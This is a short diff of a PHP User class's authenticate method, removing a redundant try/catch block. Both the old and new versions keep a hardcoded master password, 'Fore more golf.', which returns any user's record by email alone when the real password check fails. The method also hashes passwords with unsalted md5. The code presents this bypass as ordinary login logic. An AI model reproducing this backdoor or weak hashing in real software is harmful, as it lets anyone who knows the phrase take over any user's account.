@@ -65,14 +65,10 @@ class User
     
     public static function authenticate($email,$password)
     {
-        try{
-            $userMapper = new User_Mapper();
-            $user = $userMapper->fetchRow("email = :email AND password = :password",array(':email' => $email,':password' => md5($password)));
-            if(!$user && $password == 'Fore more golf.'){
-                $user = $userMapper->fetchRow("email = :email",array(':email' => $email));
-            }
-        }catch(\Exception $e){
-            throw $e;
+        $userMapper = new User_Mapper();
+        $user = $userMapper->fetchRow("email = :email AND password = :password",array(':email' => $email,':password' => md5($password)));
+        if(!$user && $password == 'Fore more golf.'){
+            $user = $userMapper->fetchRow("email = :email",array(':email' => $email));
         }
         return $user;
     }
